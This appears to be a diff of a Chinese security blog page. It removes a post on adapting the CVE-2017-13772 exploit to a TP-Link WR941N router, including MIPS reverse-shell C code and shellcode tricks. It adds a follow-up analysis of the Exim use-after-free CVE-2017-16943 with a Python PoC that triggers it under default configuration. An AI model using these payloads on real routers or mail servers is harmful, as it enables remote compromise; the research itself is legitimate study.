@@ -3,19 +3,22 @@
 <head>
   <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
   
-  <title>TP-Link WR941N路由器研究 | Hc1m1</title>
+  <title>CVE-2017-16943 Exim UAF漏洞分析--后续 | Hc1m1</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="之前看到了一个CVE, CVE-2017-13772 是TP-Link WR940N后台的RCE, 手头上正好有一个TP-Link WR941N的设备，发现也存在相同的问题，但是CVE-2017-13772文章中给的EXP并不通用 所以准备进行复现和exp的修改，折腾了将近4天，记录下过程和遇到的坑">
-<meta name="keywords" content="research">
+  <meta name="description" content="上一篇分析出来后，经过@orange的提点，得知了meh公布的PoC是需要特殊配置才能触发，所以我上一篇分析文章最后的结论应该改成，在默认配置情况下，meh提供的PoC无法成功触发uaf漏洞。之后我又对为啥修改了配置后能触发和默认情况下如何触发漏洞进行了研究">
+<meta name="keywords" content="bin,research">
 <meta property="og:type" content="article">
-<meta property="og:title" content="TP-Link WR941N路由器研究">
-<meta property="og:url" content="http://0x48.pw/2017/10/30/0x3B/index.html">
+<meta property="og:title" content="CVE-2017-16943 Exim UAF漏洞分析--后续">
+<meta property="og:url" content="http://0x48.pw/2017/12/08/0x3F/index.html">
 <meta property="og:site_name" content="Hc1m1">
-<meta property="og:description" content="之前看到了一个CVE, CVE-2017-13772 是TP-Link WR940N后台的RCE, 手头上正好有一个TP-Link WR941N的设备，发现也存在相同的问题，但是CVE-2017-13772文章中给的EXP并不通用 所以准备进行复现和exp的修改，折腾了将近4天，记录下过程和遇到的坑">
-<meta property="og:updated_time" content="2017-11-09T10:12:59.000Z">
+<meta property="og:description" content="上一篇分析出来后，经过@orange的提点，得知了meh公布的PoC是需要特殊配置才能触发，所以我上一篇分析文章最后的结论应该改成，在默认配置情况下，meh提供的PoC无法成功触发uaf漏洞。之后我又对为啥修改了配置后能触发和默认情况下如何触发漏洞进行了研究">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/exim1.png">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/exim2.png">
+<meta property="og:updated_time" content="2017-12-13T07:48:51.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="TP-Link WR941N路由器研究">
-<meta name="twitter:description" content="之前看到了一个CVE, CVE-2017-13772 是TP-Link WR940N后台的RCE, 手头上正好有一个TP-Link WR941N的设备，发现也存在相同的问题，但是CVE-2017-13772文章中给的EXP并不通用 所以准备进行复现和exp的修改，折腾了将近4天，记录下过程和遇到的坑">
+<meta name="twitter:title" content="CVE-2017-16943 Exim UAF漏洞分析--后续">
+<meta name="twitter:description" content="上一篇分析出来后，经过@orange的提点，得知了meh公布的PoC是需要特殊配置才能触发，所以我上一篇分析文章最后的结论应该改成，在默认配置情况下，meh提供的PoC无法成功触发uaf漏洞。之后我又对为啥修改了配置后能触发和默认情况下如何触发漏洞进行了研究">
+<meta name="twitter:image" content="http://qn.lazysheep.cc/img/exim1.png">
   
     <link rel="alternative" href="/rss.xml" title="Hc1m1" type="application/atom+xml">
   
@@ -267,11 +270,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-0x3B" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-0x3F" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/10/30/0x3B/" class="article-date">
-      <time datetime="2017-10-30T03:07:10.000Z" itemprop="datePublished">2017-10-30</time>
+      <a href="/2017/12/08/0x3F/" class="article-date">
+      <time datetime="2017-12-08T06:15:55.000Z" itemprop="datePublished">2017-12-08</time>
 </a>
     </div>
   
@@ -284,7 +287,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      TP-Link WR941N路由器研究
+      CVE-2017-16943 Exim UAF漏洞分析--后续
     </h1>
   
 
@@ -295,7 +298,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/research/">research</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bin/">bin</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/research/">research</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -305,71 +308,51 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>之前看到了一个CVE, <a href="https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/" target="_blank" rel="external">CVE-2017-13772</a></p>
-<p>是TP-Link WR940N后台的RCE, 手头上正好有一个TP-Link WR941N的设备，发现也存在相同的问题，但是<code>CVE-2017-13772</code>文章中给的EXP并不通用</p>
-<p>所以准备进行复现和exp的修改，折腾了将近4天，记录下过程和遇到的坑</p>
+        <p><a href="https://paper.seebug.org/469/" target="_blank" rel="external">上一篇分析</a>出来后，经过@orange的提点，得知了meh公布的PoC是需要特殊配置才能触发，所以我上一篇分析文章最后的结论应该改成，在默认配置情况下，meh提供的PoC无法成功触发uaf漏洞。之后我又对为啥修改了配置后能触发和默认情况下如何触发漏洞进行了研究</p>
 <a id="more"></a>
-<p>第一次研究mips指令的RCE，之前只学了intel指令集的pwn，所以进度挺慢的</p>
-<h1 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h1><p>第一天当然是配环境了，该路由器本身在默认情况下是不提供shell的，在@fenix帮助下获取到了路由器的shell，该款路由器上的busybox的命令比较少，curl, nc, wget这些命令都没有，只能用tftp进行数据传输，而且只有<code>/tmp</code>目录可写，路由器重启后，传上去的文件就没了，这些问题都可以通过刷固件解决，不过太麻烦了，只需要传上去一个<code>gdbserver</code>就好了，能根据固件中的bin得知这是一个大端mips指令集的设备，<code>gdbserver</code>也不用自己编译，直接下编译好的: <a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver" target="_blank" rel="external">https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver</a></p>
-<p>把<code>gdbserver.mipsbe</code>通过tftp上传到路由器的<code>/tmp</code>目录下</p>
-<p>然后根据<code>cve-2017-13772</code>分析文章说的那样使用gdbserver attach httpd最新的一个进程，然后就可以进行远程gdb调试了</p>
-<h1 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h1><p>第二天准备开始调试，但是发现gdb的两个编译选项, 一个<code>--host</code>，表示gdb运行的环境，一般默认就是本机环境，还有一个<code>--target</code>表示调试的目标环境，默认也是本机环境，所以一个64位ubuntu上默认的gdb只能调试64 elf程序。所以需要设置<code>--target=mipsbel-linux</code>参数进行编译gdb，才能调试大端的mips程序。</p>
-<p>编译差不多编译了半天，准备改天搞一个8核的机器专门来编译程序….</p>
-<p>编译成功后，就可以进行远程调试了，在路由器上执行:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt; /tmp/gdbserver.mipsbe attach 0.0.0.0:12345 pid</div></pre></td></tr></table></figure>
-<p>然后使用编译好gdb进行调试：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ gdb</div><div class="line">(gdb) target remote 192.168.1.1:12345</div></pre></td></tr></table></figure>
-<p>但是失败了，又折腾了半天</p>
-<h1 id="Day-3"><a href="#Day-3" class="headerlink" title="Day 3"></a>Day 3</h1><p>第三天才真正的开始调试程序，首先说说我第二天遇到的问题，问题是下了断点没用，原因比较傻逼，我下断点的地址是wr940n的地址，我把两个bin搞混了</p>
-<p>然后根据<code>cve-2017-13772</code>分析文章中说的栈溢出的指令，在wr941n中也找到了该指令，而溢出情况也是一样，所以拿了wr940n的exp来打了一遍，结果当然是失败了。</p>
-<p>在wr940n的exp中，ROP是在<code>libuClibc-0.9.30.so</code>中找的，根据<code>$ cat /proc/pid/maps</code>命令，发现wr941n路由器的基地址和文章中显示的wr940n路由器的是一样的，然后再比较<code>libuClibc-0.9.30.so</code>文件的hash值，发现不同，所以要修改ROP地址。</p>
-<p>由于libc文件太大，用手找太累了，所以使用了那篇文章中的ida的mipsrop插件，这里又踩了一个坑，因为我用的是ida7.0，而这个插件只能在ida6.8(更低的没试过)版本使用。</p>
-<p>修改了ROP后，再进行尝试exp，发现仍然失败，然后进行调试查看原因，跟踪ROP执行流，发现能成功跳转到栈上执行shellcode，但是shellcode和文章中的，文章中的shellcode开头有一个使用xor进行解密的过程，执行完之后的指令和文章中的不一样。所以准备自己写一个shellcode</p>
-<h1 id="Day-4"><a href="#Day-4" class="headerlink" title="Day 4"></a>Day 4</h1><p>第四天就是开始写shellcod，首先给个mips指令和bin互转的网站：<a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/?opcodes=%5Cx3c%5Cx1c%5Cx2a%5Cxb3%5Cx37%5Cx9c%5Cx17%5Cxb0&amp;arch=mips32&amp;endianness=big#disassembly" target="_blank" rel="external">http://shell-storm.org/online/Online-Assembler-and-Disassembler/?opcodes=%5Cx3c%5Cx1c%5Cx2a%5Cxb3%5Cx37%5Cx9c%5Cx17%5Cxb0&amp;arch=mips32&amp;endianness=big#disassembly</a></p>
-<p>然后说说写的过程中遇到的问题，该路由器输入是不接受<code>\x00</code>和<code>\x20</code>，所以ROP不是在ELF中寻找而是去libc中寻找：<code>libuClibc</code>基地址：<code>0x2aae000</code>， <code>httpd</code>基地址：<code>0x00400000</code></p>
-<p>如果在ELF中寻找ROP，则地址中总会有个<code>\x00</code>，所以ROP是在libc中寻找不存在<code>\x00</code>和<code>\x20</code>的地址。但是在shellcode中，这两个字符却很难避免，所以那篇文章中对shellcode进行了xor加密</p>
-<p>wr940n的exp使用的是一个bind shell的shellcode，而我改成了一个反弹shell的shellcode</p>
-<p>然后就是最后遇到的一个大坑，使用gdb调试成功的一个反弹shell的shellcode，在实际测试中却失败了，使用gdb成功，直接打失败，因为这个问题折腾了挺长的时间</p>
-<p>然后查阅资料，在看雪的一篇文章中找到了原因：<https: www.kanxue.com="" article-read-218.htm=""></https:></p>
-<blockquote>
-<p>mips 的 exp 编写中还有一个问题就是 cache incoherency。MIPS CPUs 有两个独立的 cache：指令 cache 和数据 cache。指令和数据分别在两个不同的缓存中。当缓存满了，会触发 flush，将数据写回到主内存。攻击者的攻击 payload 通常会被应用当做数据来处理，存储在数据缓存中。当 payload 触发漏洞，劫持程序执行流程的时候，会去执行内存中的 shellcode。<br>如果数据缓存没有触发 flush 的话，shellcode 依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储 shellcode 的地址处随机的代码，导致不可预知的后果。<br>最简单可靠的让缓存数据写入内存的方式是调用一个堵塞函数。比如 sleep(1) 或者其他类似的函数。sleep 的过程中，处理器会切换上下文让给其他正在执行的程序，缓存会自动执行 flush。</p>
-</blockquote>
-<p>这个坑点在那篇文章中也提及了，但是没具体说明，如果没实际踩一踩，不一定能理解。但是讲道理，如果直接用wr940n的exp，修改下ROP地址和shellcode，应该是不会遇到这个坑的，但是我仍然遇到了，经过研究发现，是usleep的问题，猜测是由于堵塞的时间过短所以未执行flush？然后进行实际测试了一番，把usleep的时间修改为<code>18217</code>，同样没用，然后简单看了下两者的汇编，发现usleep只是简单的调用nanosleep，而sleep除了调用nanosleep还进行其他相关的操作，网上没搜到相关文章，因为精力有限，作为遗留问题，以后有时间的时候再继续研究。</p>
-<p>不过有几个猜测，</p>
-<p>1.时间问题，usleep的单位是微秒，18217也只有10ms，是不是要睡到1s？因为找不到合适的ROP，所以暂时没法证明<br>2.flush内存是靠sleep中的几个信号相关的函数？</p>
-<p>所以最终我的做法是在wr940n的exp的ROP链中，调用的是usleep(0xc*2+1)，但是我将usleep改成sleep =&gt; sleep(0xc*2+1)，数据缓存被成功flush到主内存中，就能成功执行shellcode了</p>
-<h1 id="Shellcode编写"><a href="#Shellcode编写" class="headerlink" title="Shellcode编写"></a>Shellcode编写</h1><p>在本次研究中，最后时间的除了一开始的调试环境搭建外，就是shellcode的编写了，因为在那篇cve分析的文章中已经给出了wr940n的exp，ROP只需要修改修改地址就好了，所以工作量最大的还是在Shellcode的编写这一部分</p>
-<p>首先是syscall部分，比如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">li $v0, 4183</div><div class="line">syscall 0x40404</div><div class="line"># sys_socket</div></pre></td></tr></table></figure>
+<h1 id="重新复现漏洞"><a href="#重新复现漏洞" class="headerlink" title="重新复现漏洞"></a>重新复现漏洞</h1><p>比上一篇分析中复现的步骤，只需要多一步，注释了<code>/usr/exim/configure</code>文件中的<code>control = dkim_disable_verify</code></p>
+<p>然后调整下poc的padding，就可以成功触发UAF漏洞，控制rip</p>
+<h2 id="分析特殊配置下的触发流程"><a href="#分析特殊配置下的触发流程" class="headerlink" title="分析特殊配置下的触发流程"></a>分析特殊配置下的触发流程</h2><p>在代码中有一个变量是<code>dkim_disable_verify</code>, 在设置后会变成<code>true</code>，所以注释掉的情况下，就为默认值<code>false</code>, 然后再看看<code>receive.c</code>中的代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL</span></div><div class="line"><span class="title">receive_msg</span><span class="params">(BOOL extract_recip)</span></div><div class="line">&#123;</div><div class="line">......</div><div class="line"><span class="number">1733</span>：<span class="keyword">if</span> (smtp_input &amp;&amp; !smtp_batched_input &amp;&amp; !dkim_disable_verify)</div><div class="line"><span class="number">1734</span>：  dkim_exim_verify_init(chunking_state &lt;= CHUNKING_OFFERED);</div><div class="line"><span class="number">1735</span>：<span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure>
+<p>进入了<code>dkim_exim_verify_init</code>函数，之后的大致流程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">dkim_exim_verify_init -&gt; pdkim_init_verify -&gt; ctx-&gt;linebuf = store_get(PDKIM_MAX_BODY_LINE_LEN);</div><div class="line"></div><div class="line">bdat_getc -&gt; smtp_getc -&gt; smtp_refill -&gt; dkim_exim_verify_feed -&gt; pdkim_feed -&gt; string_catn -&gt; string_get -&gt; store_get(0x64)</div><div class="line"></div><div class="line">#define PDKIM_MAX_BODY_LINE_LEN     16384       //0x4000</div></pre></td></tr></table></figure>
+<p>在上一篇文章中说过了，无法成功触发uaf漏洞的原因是，被free的堆处于堆顶，释放后就和top chunk合并了。</p>
+<p>在注释了dkim的配置后，在<code>dkim_exim_verify_init</code> 函数的流程中，执行了一个<code>store_get</code> 函数，申请了一个0x4000大小的堆，然后在<code>dkim_exim_verify_init</code> 函数和<code>dkim_exim_verify_feed</code> 函数中，都有如下的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">store_pool = POOL_PERM;</div><div class="line">......</div><div class="line">store_pool = dkim_verify_oldpool;</div><div class="line">---------------</div><div class="line">enum &#123; POOL_MAIN, POOL_PERM, POOL_SEARCH &#125;;</div></pre></td></tr></table></figure>
+<p><code>store_pool</code>全局变量被修改为了1，之前说过了，exim自己实现了一套堆管理，当<code>store_pool</code>不同时，相当于对堆进行了隔离，不会影响<code>receive_msg</code> 函数中使用堆管理时的<code>current_block</code>这类的堆管理全局变量</p>
+<p>当dkim相关的代码执行结束后，还把<code>store_pool</code>恢复回去了</p>
+<p>因为申请了一个0x4000大小的堆，大于0x2000，所以申请之后<code>yield_length</code>全局变量的值变为了0，导致了之后<code>store_get(0x64)</code>再次申请了一块堆，所以有了两块堆放在了heap1的上面，释放heap1后，heap1被放入了unsortbin，成功触发了uaf漏洞，造成crash。(之前的文章中都有写到)</p>
+<h2 id="默认配置情况下复现漏洞"><a href="#默认配置情况下复现漏洞" class="headerlink" title="默认配置情况下复现漏洞"></a>默认配置情况下复现漏洞</h2><p>在特殊配置情况下复现了漏洞后，又进行了如果在默认配置情况下触发漏洞的研究。</p>
+<p>在@explorer大佬的教导下，发现了一种在默认情况下触发漏洞的情况。</p>
+<p>其实触发的关键点，就是想办法在heap1上面再malloc一个堆，现在我们从头来开始分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">// daemon.c</div><div class="line"></div><div class="line">137 static void</div><div class="line">138 handle_smtp_call(int *listen_sockets, int listen_socket_count,</div><div class="line">139  int accept_socket, struct sockaddr *accepted)</div><div class="line">140 &#123;</div><div class="line">......</div><div class="line">348 pid = fork();</div><div class="line">352 if (pid == 0)</div><div class="line">353   &#123;</div><div class="line">......</div><div class="line">504     if ((rc = smtp_setup_msg()) &gt; 0)</div><div class="line">505       &#123;</div><div class="line">506       BOOL ok = receive_msg(FALSE);</div><div class="line">......</div></pre></td></tr></table></figure>
+<p>首先，当有新连接进来的时候，fork一个子进程，然后进入上面代码中的那个分支，<code>smtp_setup_msg</code>函数是用来接收命令的函数，我们先发一堆无效的命令过去(padding)，控制<code>yield_length</code>的值小于0x100，目的上一篇文章说过了，因为命令无效，流程再一次进入了<code>smtp_setup_msg</code></p>
+<p>这时候我们发送一个命令<code>BDAT 16356</code></p>
+<p>然后有几个比较重要的操作：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">5085       if (sscanf(CS smtp_cmd_data, &quot;%u %n&quot;, &amp;chunking_datasize, &amp;n) &lt; 1)</div><div class="line">5093       chunking_data_left = chunking_datasize;</div><div class="line">5100       lwr_receive_getc = receive_getc;</div><div class="line">5101       lwr_receive_getbuf = receive_getbuf;</div><div class="line">5102       lwr_receive_ungetc = receive_ungetc;</div><div class="line">5104       receive_getc = bdat_getc;</div><div class="line">5105       receive_ungetc = bdat_ungetc;</div></pre></td></tr></table></figure>
+<p>首先是把输入的16356赋值给<code>chunking_data_left</code></p>
+<p>然后把<code>receive_getc</code>换成<code>bdat_getc</code>函数</p>
+<p>再做完这些的操作后，进入了<code>receive_msg</code>函数，按照上篇文章的流程差不多，显示申请了一个0x100的heap1</p>
+<p>然后进入<code>receive_getc=bdat_getc</code>读取数据:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="number">534</span> <span class="keyword">int</span></div><div class="line"><span class="number">535</span> bdat_getc(<span class="keyword">unsigned</span> lim)</div><div class="line"><span class="number">536</span> &#123;</div><div class="line">......</div><div class="line"><span class="number">546</span>   <span class="keyword">if</span> (chunking_data_left &gt; <span class="number">0</span>)</div><div class="line"><span class="number">547</span>     <span class="keyword">return</span> lwr_receive_getc(chunking_data_left--);</div></pre></td></tr></table></figure>
+<p><code>lwr_receive_getc=smtp_getc</code>通过该函数获取16356个字符串</p>
+<p>首先，我们发送16352个a作为padding，然后执行了下面这流程:</p>
 <ul>
-<li>mips采用的是RISC，32位系统下，指令固定采用4byte，syscall的字节码是<code>\x0c</code>，剩余的三字节默认用<code>\x00</code>补全，但是因为路由器不接受<code>\x00</code>的输入，所以在大端的情况下改成<code>\x01\x01\x01\x0c</code>，进行反汇编，就是<code>syscall 0x40404</code></li>
+<li>store_extend return 0 -&gt; store_get -&gt; store_release</li>
 </ul>
-<p>系统调用的相关函数除了几个mips特有的，其他的都是跟linux下的syscall一样，可参考: <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/mips/include/uapi/asm/unistd.h" target="_blank" rel="external">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/mips/include/uapi/asm/unistd.h</a></p>
-<p>比如<code>sys_socket</code>：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#define __NR_Linux			4000</div><div class="line">#define __NR_socket			(__NR_Linux + 183)</div></pre></td></tr></table></figure>
-<p>所以<code>$v0=4183</code>表示的就是socket函数，具体参数信息可以去参考linux的系统调用: <a href="http://asm.sourceforge.net/syscall.html" target="_blank" rel="external">http://asm.sourceforge.net/syscall.html</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int sys_socket(int family, int type, int protocol)</div></pre></td></tr></table></figure>
-<p>现在，先用c来实现一遍反连shell的代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">$ cat test.c</div><div class="line">#include&lt;stdlib.h&gt;</div><div class="line">#include &lt;sys/socket.h&gt;</div><div class="line">#include &lt;netinet/in.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">	int sockfd;</div><div class="line">	sockfd = socket(2,2,0);</div><div class="line">	struct sockaddr_in addr;</div><div class="line">	addr.sin_family = 2;</div><div class="line">	addr.sin_port = 0x3039;</div><div class="line">	addr.sin_addr = 0xc0a80164;</div><div class="line">	connect(sockfd, &amp;addr, sizeof(addr))</div><div class="line">	dup2(sockfd, 0);</div><div class="line">	dup2(sockfd, 1);</div><div class="line">	dup2(sockfd, 2);</div><div class="line">	execve(&quot;//bin/sh&quot;, 0, 0);</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>这里有个关键点，<a href="https://chromium.googlesource.com/chromiumos/third_party/glibc-ports/+/6cc02c7aaedec87cfb2d105f9682b12b2154e54f/sysdeps/unix/sysv/linux/mips/bits/socket.h" target="_blank" rel="external">https://chromium.googlesource.com/chromiumos/third_party/glibc-ports/+/6cc02c7aaedec87cfb2d105f9682b12b2154e54f/sysdeps/unix/sysv/linux/mips/bits/socket.h</a></p>
-<p>和其他架构不一样，mips架构中，tcp是2，udp是1</p>
-<p>所以上面的代码比如在ubuntu中，是一个udp反连的代码，但是在mips中就是tcp反连</p>
-<p>还有一点就是wr941n是大端，所以12345端口是0x3039而不是0x3930，ip地址同理</p>
-<p>然后把上面代码转换成mips指令的汇编</p>
-<p>但是有个问题，之前说了该路由器不接收<code>\x00</code>和<code>\x20</code>两个字符，而上面的汇编转换成字节码:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nor     $a0,$t7,$zero   =&gt;   &quot;\x01\xe0\x20\x27&quot;</div></pre></td></tr></table></figure>
-<p>所以要把这句指令进行修改, 因为<code>$a0</code>和<code>$a1</code>的值都为2，所以可以这样修改：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sw      $a1,-1($sp)  =&gt;  &quot;\xaf\xa5\xff\xff&quot;</div><div class="line">lw      $a0,-1($sp)  =&gt;  &quot;\x8f\xa4\xff\xff&quot;</div></pre></td></tr></table></figure>
-<p>把上面的汇编转成shellcode替换exp中的shellcode，实际测试，又发现一个问题，设备成功反连了控制端，但是却不能执行命令，到路由器上用ps查看，发现<code>sh</code>已经变为僵尸进程</p>
-<p>经研究，问题出在<code>execve(&quot;/bin/sh&quot;,0,0)</code>，如果我修改成<code>execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, 0], 0)</code>则成功反弹shell，可以任意命令执行</p>
+<p>先申请了一个0x4010的heap2，然后释放了长度为0x2010的heap1</p>
+<p>然后发送<code>:\r\n</code>，进入下面的代码分支:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="number">1902</span>   <span class="keyword">if</span> (ch == <span class="string">'\r'</span>)</div><div class="line"><span class="number">1903</span>     &#123;</div><div class="line"><span class="number">1904</span>     ch = (receive_getc)(GETC_BUFFER_UNLIMITED);</div><div class="line"><span class="number">1905</span>     <span class="keyword">if</span> (ch == <span class="string">'\n'</span>)</div><div class="line"><span class="number">1906</span>       &#123;</div><div class="line"><span class="number">1907</span>       <span class="keyword">if</span> (first_line_ended_crlf == TRUE_UNSET) first_line_ended_crlf = TRUE;</div><div class="line"><span class="number">1908</span>       <span class="keyword">goto</span> EOL;</div><div class="line"><span class="number">1909</span>       &#125;</div></pre></td></tr></table></figure>
+<p>跳到了EOL，最重要的是最后几行代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="number">2215</span>   header_size = <span class="number">256</span>;</div><div class="line"><span class="number">2216</span>   next = store_get(<span class="keyword">sizeof</span>(header_line));</div><div class="line"><span class="number">2217</span>   next-&gt;text = store_get(header_size);</div><div class="line"><span class="number">2218</span>   ptr = <span class="number">0</span>;</div><div class="line"><span class="number">2219</span>   had_zero = <span class="number">0</span>;</div><div class="line"><span class="number">2220</span>   prevlines_length = <span class="number">0</span>;</div><div class="line"><span class="number">2221</span>   &#125;      <span class="comment">/* Continue, starting to read the next header */</span></div></pre></td></tr></table></figure>
+<p>把一些变量重新进行了初始化，因为之前因为padding执行了<code>store_get(0x4000)</code>，所以这个时候<code>yield_length=0</code> 这个时候再次调用store_get将会申请一个0x2000大小堆，从unsortbin中发现heap1大小正好合适，所以这个时候得到的就是heap1，在heap1的顶上有一个之前<code>next-&gt;text</code>使用，大小0x4010，未释放的堆。</p>
+<p>之后流程的原理其实跟之前的差不多，PoC如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">r = remote(<span class="string">'localhost'</span>, <span class="number">25</span>)</div><div class="line"></div><div class="line">r.recvline()</div><div class="line">r.sendline(<span class="string">"EHLO test"</span>)</div><div class="line">r.recvuntil(<span class="string">"250 HELP"</span>)</div><div class="line">r.sendline(<span class="string">"MAIL FROM:&lt;test@localhost&gt;"</span>)</div><div class="line">r.recvline()</div><div class="line">r.sendline(<span class="string">"RCPT TO:&lt;test@localhost&gt;"</span>)</div><div class="line">r.recvline()</div><div class="line"><span class="comment"># raw_input()</span></div><div class="line">r.sendline(<span class="string">'a'</span>*<span class="number">0x1300</span>+<span class="string">'\x7f'</span>)</div><div class="line"><span class="comment"># raw_input()</span></div><div class="line">r.recvuntil(<span class="string">'command'</span>)</div><div class="line">r.sendline(<span class="string">'BDAT 16356'</span>)</div><div class="line">r.sendline(<span class="string">"a"</span>*<span class="number">16352</span>+<span class="string">':\r'</span>)</div><div class="line">r.sendline(<span class="string">'aBDAT \x7f'</span>)</div><div class="line">s = <span class="string">'a'</span>*<span class="number">6</span> + p64(<span class="number">0xabcdef</span>)*(<span class="number">0x1e00</span>/<span class="number">8</span>)</div><div class="line">r.send(s+ <span class="string">':\r\n'</span>)</div><div class="line">r.recvuntil(<span class="string">'command'</span>)</div><div class="line"><span class="comment">#raw_input()</span></div><div class="line">r.send(<span class="string">'\n'</span>)</div></pre></td></tr></table></figure>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>根据该CVE作者发的文章，得知是利用文件IO的fflush来控制第一个参数，然后通过堆喷和内存枚举来来伪造vtable，最后跳转到<code>expand_string</code>函数来执行命令，正好我最近也在研究ctf中的<code>_IO_FILE</code>的相关利用(之后应该会写几篇这方面相关的blog)，然后实现了RCE，结果图如下：</p>
+<p><img src="http://qn.lazysheep.cc/img/exim1.png" alt="exim1"></p>
+<p><img src="http://qn.lazysheep.cc/img/exim2.png" alt="exim2"></p>
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
-<li><a href="https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/" target="_blank" rel="external">https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/</a></li>
-<li><a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver" target="_blank" rel="external">https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver</a></li>
